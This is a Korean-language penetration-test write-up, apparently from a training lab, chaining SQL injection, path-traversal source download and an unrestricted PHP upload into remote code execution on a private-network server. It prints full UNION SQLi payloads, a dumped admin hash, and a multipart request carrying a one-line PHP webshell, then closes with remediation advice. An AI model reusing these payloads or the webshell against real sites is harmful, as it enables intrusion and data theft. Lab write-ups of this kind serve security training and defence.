

---

## 취약점 개요

|항목|내용|
|---|---|
|대상 서버|http://192.168.200.107|
|취약점 유형|SQL Injection + 파일 업로드 취약점 (Unrestricted File Upload)|
|최종 결과|RCE (Remote Code Execution) 달성|
|실행 권한|uid=1(daemon) gid=1(daemon) groups=1(daemon)|

---

## 전체 공격 체인

|단계|내용|결과|
|---|---|---|
|1|SQL Injection (UNION-based)|DB 구조 파악|
|2|`hm_admin_tb` 조회|관리자 계정 탈취|
|3|소스코드 다운로드|저장 경로 파악|
|4|공지사항 파일 첨부 업로드|shell.php 업로드 성공|
|5|SQL Injection으로 파일명 확인|notice_6aec1b7bd335b.php 확인|
|6|웹쉘 실행|**RCE 달성**|

---

## 단계별 상세

---

### 1단계: SQL Injection으로 테이블/컬럼 정보 수집

**취약점 위치:**

```
http://192.168.200.107/kisec/mypage/mypage_mtm_view.html?idx=
```

**테이블 목록 조회:**

```
http://192.168.200.107/kisec/mypage/mypage_mtm_view.html?idx=-6777' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(table_name),NULL,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

**발견한 주요 테이블:**

- `hm_admin_tb` → 관리자 계정
- `hm_coupon_type_tb` → 쿠폰
- `b_notice` → 공지사항 (최종 웹쉘 업로드 성공)

---

### 2단계: 관리자 계정 탈취

**컬럼 조회:**

```
http://192.168.200.107/kisec/mypage/mypage_mtm_view.html?idx=-6777' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(column_name),NULL,NULL,NULL FROM information_schema.columns WHERE table_name=0x686d5f61646d696e5f7462-- -
```

**계정 정보 조회:**

```
http://192.168.200.107/kisec/mypage/mypage_mtm_view.html?idx=-6777' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(admin_mem_id,0x3a,passwd),NULL,NULL,NULL FROM hm_admin_tb-- -
```

**결과:**

- ID: `conquerer`
- PW Hash: `2b83a3b2e2cae7477080b049d15c23b3` (MD5)

---

### 3단계: 소스코드 다운로드로 경로 분석

![](Images/Pasted%20image%2020261105153145.png)
**파일 다운로드 취약점 활용 (`_core/_download.php`):**

```
http://192.168.200.107/_core/_download.php?file_url=../../_admin/_action&file_name=board.do.php&real_name=board.php
http://192.168.200.107/_core/_download.php?file_url=../../_core/_common&file_name=var.common.php&real_name=var.php
```


![](Images/Pasted%20image%2020261105153318.png)

![](Images/Pasted%20image%2020261105153225.png)
**`var.common.php`에서 확인한 저장 경로:**

```php
$NOTICE_URL = "../../_core/_files/notice/"
```

**`board.do.php` 취약한 코드 (확장자 검증 없음):**

```php
// isImageExt() 검증 없음!
$_pic_name = uniqid("notice_");
$_pic_ext = getFileExtension($_FILES["file_".$i]["name"], true);
$_fObj = fileUpload($_FILES["file_".$i]["tmp_name"], $_pic_name.".".$_pic_ext, $NOTICE_URL);
```

---

### 4단계: 공지사항 파일 첨부로 웹쉘 업로드

![](Images/Pasted%20image%2020261105152658.png)


![](Images/Pasted%20image%2020261105152734.png)
**Burp Suite Repeater 요청:**

```http
POST /_admin/_action/board.do.php HTTP/1.1
Host: 192.168.200.107
Cookie: PHPSESSID=qa2iqrer3f5qg7qb5i0p0u4bg2; cookie_admin_id=conquerer; cookie_admin_pass=2b83a3b2e2cae7477080b049d15c23b3; cookie_admin_name=%EB%93%A4%EC%99%80%EB%94%B0%EB%84%A4; cookie_admin_email=conquerer%40kisec.com; cookie_admin_grade=YYYYYYYYY
Content-Type: multipart/form-data; boundary=----WebKitBoundary

------WebKitBoundary
Content-Disposition: form-data; name="Mode"

up_board_notice
------WebKitBoundary
Content-Disposition: form-data; name="idx"

36
------WebKitBoundary
Content-Disposition: form-data; name="b_status"

y
------WebKitBoundary
Content-Disposition: form-data; name="b_writer"

전체관리자
------WebKitBoundary
Content-Disposition: form-data; name="b_title"

테스트 파일입니다.
------WebKitBoundary
Content-Disposition: form-data; name="file_1"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET["cmd"]); ?>
------WebKitBoundary--
```

**Response:**
![](Images/Pasted%20image%2020261105152824.png)
```
HTTP/1.1 200 OK
alert('공지사항을 수정하였습니다.');
```

→ **업로드 성공!**

---

### 5단계: SQL Injection으로 저장된 파일명 확인

**b_notice 컬럼 조회:**

```
http://192.168.200.107/kisec/mypage/mypage_mtm_view.html?idx=-6777' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(column_name),NULL,NULL,NULL FROM information_schema.columns WHERE table_name=0x625f6e6f74696365-- -
```

**파일명 조회:**

```
http://192.168.200.107/kisec/mypage/mypage_mtm_view.html?idx=-6777' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,GROUP_CONCAT(file_1,0x3a,real_name_1),NULL,NULL,NULL FROM b_notice WHERE idx=36-- -
```

**결과:**
![](Images/Pasted%20image%2020261105152959.png)

```
notice_6aec1b7bd335b.php:shell.php
```

---

### 6단계: 웹쉘 실행 → RCE 성공

**웹쉘 URL:**

```
http://192.168.200.107/_core/_files/notice/notice_6aec1b7bd335b.php?cmd=id
```

![](Images/Pasted%20image%2020261105153426.png)

**실행 결과:**

```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

> ✅ 서버 내 임의 명령어 실행 성공 (RCE 달성)

---

## 취약점 원인 분석

### SQL Injection

- `idx` 파라미터 입력값 검증 없음
- Prepared Statement 미사용
- UNION-based SQLi로 DB 전체 조회 가능

### 파일 업로드 취약점

- 공지사항 파일 첨부 기능에서 확장자 검증 없음
- `isImageExt()` 함수 미호출
- 업로드 디렉토리에서 PHP 실행 가능

---

## 대응 방안

|취약점|대응 방안|
|---|---|
|SQL Injection|Prepared Statement 사용, 입력값 검증|
|파일 업로드|허용 확장자 화이트리스트 적용 (jpg/png/gif 등)|
|파일 업로드|업로드 디렉토리 PHP 실행 권한 제거|
|파일 업로드|파일 저장 시 확장자 강제 변환|
|소스코드 노출|`_download.php` 경로 검증 강화 (Path Traversal 차단)|